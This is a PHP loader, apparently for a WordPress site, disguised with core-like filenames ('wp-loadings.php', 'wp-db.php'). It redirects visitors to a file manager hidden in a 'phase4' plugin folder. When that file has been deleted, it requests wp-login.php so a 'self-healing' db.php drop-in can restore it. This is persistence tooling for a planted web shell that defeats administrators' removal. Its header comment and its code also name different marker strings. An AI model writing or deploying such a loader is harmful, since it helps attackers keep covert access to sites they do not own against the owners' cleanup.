<?php
/**
 * wp-loadings.php — self-healing loader for the phase4 filemanager plugin.
 *
 * Drop this file into the wp-content/ directory. It performs three jobs:
 *
 *   1. Look for the protected file at:
 *        /wp-content/plugins/phase4/wp-db.php
 *      The file is considered "present" only when it exists AND contains
 *      the marker string "wordpressx". If it is present, the visitor is
 *      transparently redirected to that file.
 *
 *   2. If the file is missing, the script sends a single GET request to
 *      the site's wp-login.php (so WordPress runs its normal boot and any
 *      active drop-ins/db.php self-healers get a chance to restore the
 *      missing plugin file in the background). The script then polls the
 *      filesystem every 2 seconds to see if the file reappeared.
 *
 *   3. If the file is still missing after a bounded number of polls, the
 *      script prints "filemanager is deleted, ask the admin to upload
 *      again" instead of looping forever.
 *
 * URL handling:
 *   - If this file is served from  https://example.com/wp-content/wp-loadings.php
 *       then wp-login.php is fetched from  https://example.com/wp-login.php
 *   - If this file is served from  https://example.com/wp/wp-content/wp-loadings.php
 *       then wp-login.php is fetched from  https://example.com/wp/wp-login.php
 *   In other words: any /wp/ prefix in the request path is preserved
 *   when building the wp-login.php URL. Everything else is auto-detected
 *   from the HTTP_HOST / request URI.
 *
 * NOTES
 * --------------------------------------------------------------------
 * - This script runs standalone, before WordPress loads. It therefore
 *   uses only native PHP: cURL (preferred) or the HTTP stream wrapper
 *   (fallback) for the outbound GET. No WP helper functions are used,
 *   which is why esc_html()/wp_json_encode() etc. must never appear here.
 * - HTTP fetches work even on hosts where allow_url_fopen=0 because cURL
 *   is tried first.
 *
 * DEBUGGING
 * --------------------------------------------------------------------
 * WLS_DEBUG (default true) writes a step-by-step trace to:
 *
 *     wp-content/wp-loadings-debug.log
 *
 * Fatal errors are captured at shutdown and also echoed to the browser,
 * so a blank page can never hide the cause while debugging. Set
 * WLS_DEBUG back to false (or delete the block) once the loader works.
 *
 * @package wp-loadings
 */

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

// Marker that must be present inside wp-db.php for it to be considered real.
if ( ! defined( 'WLS_MARKER' ) ) {
	define( 'WLS_MARKER', 'password' );
}

// Relative path (from the WordPress install root) to the protected file.
if ( ! defined( 'WLS_TARGET_REL' ) ) {
	define( 'WLS_TARGET_REL', 'wp-content/plugins/phase4/wp-db.php' );
}

// Absolute filesystem path to the WordPress install root. Auto-detected
// below; can be overridden by defining WLS_WP_ROOT before including this file.
if ( ! defined( 'WLS_WP_ROOT' ) ) {
	define( 'WLS_WP_ROOT', dirname( __DIR__ ) ); // __DIR__ = .../wp-content
}

// Number of polling attempts and the delay between them.
if ( ! defined( 'WLS_MAX_ATTEMPTS' ) ) {
	define( 'WLS_MAX_ATTEMPTS', 5 );
}
if ( ! defined( 'WLS_POLL_DELAY' ) ) {
	define( 'WLS_POLL_DELAY', 2 ); // seconds
}

// --- DEBUG TOGGLE ----------------------------------------------------------
// Set to true to write a step-by-step trace to wp-content/wp-loadings-debug.log.
// Flip back to false (or delete this block) once the loader is working.
if ( ! defined( 'WLS_DEBUG' ) ) {
	define( 'WLS_DEBUG', true );
}

// While debugging, force PHP to surface errors instead of a blank page.
if ( WLS_DEBUG ) {
	@ini_set( 'display_errors', '1' );
	@ini_set( 'display_startup_errors', '1' );
	@error_reporting( E_ALL );
	@ini_set( 'log_errors', '1' );
}

// ---------------------------------------------------------------------------
// Debug helpers
// ---------------------------------------------------------------------------

/**
 * Resolve the debug log path: wp-content/wp-loadings-debug.log.
 */
function wls_log_path() {
	$log_dir = defined( 'WLS_WP_ROOT' ) ? WLS_WP_ROOT : dirname( __DIR__ );
	return rtrim( $log_dir, '/\\' ) . DIRECTORY_SEPARATOR . 'wp-content' . DIRECTORY_SEPARATOR . 'wp-loadings-debug.log';
}

if ( ! function_exists( 'wls_log' ) ) {
	/**
	 * Append a single line to the debug log when WLS_DEBUG is enabled.
	 * Completely no-op when WLS_DEBUG is false.
	 *
	 * @param string $step Short tag identifying where we are in the flow.
	 * @param mixed  $info Optional context value (scalar, array, or string).
	 */
	function wls_log( $step, $info = null ) {
		if ( ! defined( 'WLS_DEBUG' ) || ! WLS_DEBUG ) {
			return;
		}

		$ts  = gmdate( 'Y-m-d H:i:s' );
		$ip  = isset( $_SERVER['REMOTE_ADDR'] ) ? $_SERVER['REMOTE_ADDR'] : '-';
		$uri = isset( $_SERVER['REQUEST_URI'] ) ? $_SERVER['REQUEST_URI'] : '-';

		if ( null === $info ) {
			$line = sprintf( "[%s] [%s] [%s] %s\n", $ts, $ip, $uri, $step );
		} else {
			if ( is_array( $info ) || is_object( $info ) ) {
				// json_encode may fail on non-UTF8 payloads (e.g. Windows
				// paths) — fall back to print_r in that case.
				$info_str = @json_encode( $info );
				if ( false === $info_str || null === $info_str ) {
					$info_str = @print_r( $info, true );
				}
			} else {
				$info_str = (string) $info;
			}
			$line = sprintf( "[%s] [%s] [%s] %s %s\n", $ts, $ip, $uri, $step, $info_str );
		}

		// Surface the most recent PHP error alongside the step so silent
		// failures become visible.
		$err = error_get_last();
		if ( is_array( $err ) && ! empty( $err['message'] ) ) {
			$line .= sprintf(
				"    last_error: type=%d file=%s line=%d msg=%s\n",
				(int) $err['type'],
				isset( $err['file'] ) ? $err['file'] : '-',
				isset( $err['line'] ) ? (int) $err['line'] : 0,
				str_replace( array( "\r", "\n" ), ' ', (string) $err['message'] )
			);
		}

		@file_put_contents( wls_log_path(), $line, FILE_APPEND );
	}
}

if ( ! function_exists( 'wls_catch_php_error' ) ) {
	/**
	 * Route PHP warnings/notices into the debug log instead of letting
	 * them be swallowed (or corrupt the redirect).
	 */
	function wls_catch_php_error( $errno, $errstr, $errfile, $errline ) {
		if ( ! defined( 'WLS_DEBUG' ) || ! WLS_DEBUG ) {
			return false; // let PHP's normal handler run
		}
		wls_log( 'php_error', array(
			'errno'  => $errno,
			'errstr' => $errstr,
			'file'   => $errfile,
			'line'   => $errline,
		) );
		return true; // mark as handled so nothing is printed inline
	}
}

if ( ! function_exists( 'wls_shutdown_capture' ) ) {
	/**
	 * Last-chance hook for fatal/parse/compile errors. PHP stops executing
	 * on those, so neither try/catch nor set_error_handler can catch them.
	 * register_shutdown_function fires after termination, which lets us
	 * read error_get_last() and dump the failure into the log AND echo it,
	 * so a blank page is impossible while WLS_DEBUG is on.
	 */
	function wls_shutdown_capture() {
		if ( ! defined( 'WLS_DEBUG' ) || ! WLS_DEBUG ) {
			return;
		}
		$err = error_get_last();
		if ( ! is_array( $err ) ) {
			return;
		}
		// Only react to real fatal categories.
		$fatal_types = array( E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR, E_USER_ERROR );
		if ( ! in_array( (int) $err['type'], $fatal_types, true ) ) {
			return;
		}

		$ts  = gmdate( 'Y-m-d H:i:s' );
		$ip  = isset( $_SERVER['REMOTE_ADDR'] ) ? $_SERVER['REMOTE_ADDR'] : '-';
		$uri = isset( $_SERVER['REQUEST_URI'] ) ? $_SERVER['REQUEST_URI'] : '-';

		$line = sprintf(
			"[%s] [%s] [%s] fatal_shutdown type=%d file=%s line=%d msg=%s\n",
			$ts,
			$ip,
			$uri,
			(int) $err['type'],
			isset( $err['file'] ) ? $err['file'] : '-',
			isset( $err['line'] ) ? (int) $err['line'] : 0,
			str_replace( array( "\r", "\n" ), ' ', (string) $err['message'] )
		);
		@file_put_contents( wls_log_path(), $line, FILE_APPEND );

		if ( ! headers_sent() ) {
			header( 'Content-Type: text/plain; charset=utf-8' );
		}
		echo "\n\nwp-loadings.php fatal error:\n" . $line;
	}
}

if ( WLS_DEBUG ) {
	set_error_handler( 'wls_catch_php_error', E_ALL );
	register_shutdown_function( 'wls_shutdown_capture' );
}

// ---------------------------------------------------------------------------
// URL helpers
// ---------------------------------------------------------------------------

/**
 * Shared URL builder: detects scheme, host and the WordPress install root
 * (anything before /wp-content/ in the current request path) so that
 * subdirectory installs like /wp/ keep working.
 *
 * @return array { string $scheme, string $host, string $install_root }
 */
function wls_build_base() {
	$scheme = ( ! empty( $_SERVER['HTTPS'] ) && 'off' !== $_SERVER['HTTPS'] )
		|| ( ! empty( $_SERVER['HTTP_X_FORWARDED_PROTO'] ) && 'https' === $_SERVER['HTTP_X_FORWARDED_PROTO'] )
		? 'https'
		: 'http';
	$host = isset( $_SERVER['HTTP_HOST'] ) ? $_SERVER['HTTP_HOST'] : '';
	$uri  = isset( $_SERVER['REQUEST_URI'] ) ? $_SERVER['REQUEST_URI'] : '';

	// Strip query string.
	if ( false !== ( $q = strpos( $uri, '?' ) ) ) {
		$uri = substr( $uri, 0, $q );
	}

	// We expect to be at /wp-content/wp-loadings.php or /wp/wp-content/wp-loadings.php.
	// Anything before "/wp-content/" is the install root that we preserve.
	$install_root = '';
	if ( false !== ( $pos = strpos( $uri, '/wp-content/' ) ) ) {
		$install_root = substr( $uri, 0, $pos );
	}

	return array( $scheme, $host, $install_root );
}

/**
 * Build the absolute URL of the protected wp-db.php file.
 */
function wls_build_target_url() {
	list( $scheme, $host, $install_root ) = wls_build_base();
	$url = $scheme . '://' . $host . $install_root . '/' . WLS_TARGET_REL;

	wls_log( 'url.target', array(
		'scheme'          => $scheme,
		'host'            => $host,
		'install_root'    => $install_root,
		'final'           => $url,
		'has_host'        => ( '' !== $host ),
		'has_installroot' => ( '' !== $install_root ),
	) );

	return $url;
}

/**
 * Build the absolute URL of wp-login.php, preserving any /wp/ prefix.
 */
function wls_build_login_url() {
	list( $scheme, $host, $install_root ) = wls_build_base();
	$url = $scheme . '://' . $host . $install_root . '/wp-login.php';

	wls_log( 'url.login', array(
		'scheme'          => $scheme,
		'host'            => $host,
		'install_root'    => $install_root,
		'final'           => $url,
		'has_host'        => ( '' !== $host ),
		'has_installroot' => ( '' !== $install_root ),
	) );

	return $url;
}

// ---------------------------------------------------------------------------
// File helpers
// ---------------------------------------------------------------------------

/**
 * Decide whether the protected file is present and intact.
 *
 * A file counts as "present" only when:
 *   - it exists on disk,
 *   - it is readable,
 *   - it has a non-empty body, and
 *   - its body contains the WLS_MARKER string.
 */
function wls_target_is_present( $fs_path ) {
	if ( ! @file_exists( $fs_path ) ) {
		wls_log( 'check.exists', array( 'path' => $fs_path, 'exists' => false ) );
		return false;
	}
	if ( ! @is_readable( $fs_path ) ) {
		wls_log( 'check.readable', array( 'path' => $fs_path, 'readable' => false ) );
		return false;
	}

	$body = @file_get_contents( $fs_path );
	if ( false === $body ) {
		wls_log( 'check.read_failed', array( 'path' => $fs_path ) );
		return false;
	}
	if ( '' === trim( $body ) ) {
		wls_log( 'check.empty', array( 'path' => $fs_path, 'size' => strlen( $body ) ) );
		return false;
	}

	$has_marker = ( false !== strpos( $body, WLS_MARKER ) );
	wls_log( 'check.marker', array(
		'path'       => $fs_path,
		'size'       => strlen( $body ),
		'marker'     => WLS_MARKER,
		'has_marker' => $has_marker,
	) );

	return $has_marker;
}

/**
 * Send a single GET request to wp-login.php. We do not care about the
 * response body — the goal is just to nudge WordPress into running its
 * own bootstrap so any active self-healing drop-ins (e.g. db.php) can
 * re-create the missing plugin file.
 *
 * Uses cURL when available (works even when allow_url_fopen=0) and falls
 * back to the native HTTP stream wrapper otherwise.
 *
 * @param string $login_url URL to hit.
 * @return string The method actually used: 'curl', 'fopen' or 'none'.
 */
function wls_trigger_login_request( $login_url ) {
	if ( function_exists( 'curl_init' ) ) {
		$ch = curl_init();
		curl_setopt( $ch, CURLOPT_URL, $login_url );
		curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
		curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
		curl_setopt( $ch, CURLOPT_MAXREDIRS, 3 );
		curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 10 );
		curl_setopt( $ch, CURLOPT_TIMEOUT, 15 );
		curl_setopt( $ch, CURLOPT_USERAGENT, 'wp-loadings.php (self-heal probe)' );
		curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, true );
		curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );

		$body  = @curl_exec( $ch );
		$errno = curl_errno( $ch );
		$err   = curl_error( $ch );
		$code  = (int) curl_getinfo( $ch, CURLINFO_RESPONSE_CODE );
		@curl_close( $ch );

		wls_log( 'remote.curl', array(
			'url'       => $login_url,
			'http_code' => $code,
			'errno'     => $errno,
			'error'     => $err,
			'body_len'  => strlen( (string) $body ),
		) );

		return 'curl';
	}

	// Fallback: native PHP HTTP stream wrapper.
	$ctx = stream_context_create(
		array(
			'http' => array(
				'timeout'         => 10,
				'method'          => 'GET',
				'header'          => "User-Agent: wp-loadings.php (self-heal probe)\r\n",
				'ignore_errors'   => true,
				'follow_location' => 1,
				'max_redirects'   => 3,
			),
		)
	);
	$body = @file_get_contents( $login_url, false, $ctx );

	wls_log( 'remote.fopen', array(
		'url'      => $login_url,
		'result'   => ( false === $body ) ? 'false' : 'ok',
		'body_len' => strlen( (string) $body ),
		'headers'  => isset( $http_response_header ) ? $http_response_header : array(),
	) );

	return 'fopen';
}

/**
 * Friendly "give up" page.
 *
 * NOTE: native htmlspecialchars() is used on purpose — WordPress helpers
 * like esc_html() are NOT loaded when this standalone script runs, and
 * calling them produces a fatal "undefined function" error (blank page).
 */
function wls_render_missing_message() {
	$msg = 'filemanager is deleted, ask the admin to upload again';
	$esc = function ( $s ) {
		return htmlspecialchars( (string) $s, ENT_QUOTES, 'UTF-8' );
	};
	?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Filemanager unavailable</title>
<style>
	body { font-family: -apple-system, Segoe UI, Roboto, sans-serif; background:#f6f7f7; color:#1d2327; margin:0; padding:0; }
	.box  { max-width:560px; margin:10vh auto; background:#fff; border:1px solid #dcdcde; border-radius:8px; padding:32px; text-align:center; box-shadow:0 1px 2px rgba(0,0,0,.04); }
	h1    { font-size:20px; margin:0 0 12px; }
	p     { margin:0; color:#50575e; line-height:1.5; }
	small { display:block; margin-top:18px; color:#8c8f94; }
</style>
</head>
<body>
	<div class="box">
		<h1>Filemanager unavailable</h1>
		<p><?php echo $esc( $msg ); ?></p>
		<small>wp-loadings.php &middot; <?php echo $esc( WLS_TARGET_REL ); ?></small>
	</div>
</body>
</html>
	<?php
}

// ---------------------------------------------------------------------------
// Main flow
// ---------------------------------------------------------------------------

// If somebody hit this file from the CLI, do nothing.
if ( PHP_SAPI === 'cli' || PHP_SAPI === 'cli-server' ) {
	return;
}

// Always respond as plain HTML.
header( 'Content-Type: text/html; charset=utf-8' );
header( 'Cache-Control: no-store, no-cache, must-revalidate' );
header( 'Pragma: no-cache' );

$fs_path    = rtrim( WLS_WP_ROOT, '/\\' ) . DIRECTORY_SEPARATOR . str_replace( '/', DIRECTORY_SEPARATOR, WLS_TARGET_REL );
$target_url = wls_build_target_url();
$login_url  = wls_build_login_url();

wls_log( 'boot', array(
	'sapi'         => PHP_SAPI,
	'fs_path'      => $fs_path,
	'target_url'   => $target_url,
	'login_url'    => $login_url,
	'wp_root'      => WLS_WP_ROOT,
	'marker'       => WLS_MARKER,
	'max_attempts' => WLS_MAX_ATTEMPTS,
	'poll_delay'   => WLS_POLL_DELAY,
	'curl_loaded'  => function_exists( 'curl_init' ),
	'allow_fopen'  => (int) @ini_get( 'allow_url_fopen' ),
) );

try {

	// 1. Fast path: file already exists, just redirect.
	if ( wls_target_is_present( $fs_path ) ) {
		wls_log( 'redirect.fast', array( 'to' => $target_url ) );
		header( 'Location: ' . $target_url, true, 302 );
		exit;
	}

	// 2. Slow path: nudge WordPress, then poll.
	$wls_used = wls_trigger_login_request( $login_url );
	wls_log( 'poll.start', array( 'method' => $wls_used, 'max_attempts' => WLS_MAX_ATTEMPTS ) );

	$attempt = 1;
	while ( $attempt <= WLS_MAX_ATTEMPTS ) {
		sleep( (int) WLS_POLL_DELAY );

		if ( wls_target_is_present( $fs_path ) ) {
			wls_log( 'redirect.poll', array( 'attempt' => $attempt, 'to' => $target_url ) );
			header( 'Location: ' . $target_url, true, 302 );
			exit;
		}

		wls_log( 'poll.miss', array( 'attempt' => $attempt ) );
		$attempt++;
	}

	// 3. Give up.
	wls_log( 'giveup', array( 'fs_path' => $fs_path ) );
	wls_render_missing_message();
	wls_log( 'boot.end' );

} catch ( Throwable $e ) {
	wls_log( 'exception', array(
		'message' => $e->getMessage(),
		'file'    => $e->getFile(),
		'line'    => $e->getLine(),
		'class'   => get_class( $e ),
	) );
	// Still render the friendly page even if something blew up internally.
	wls_render_missing_message();
}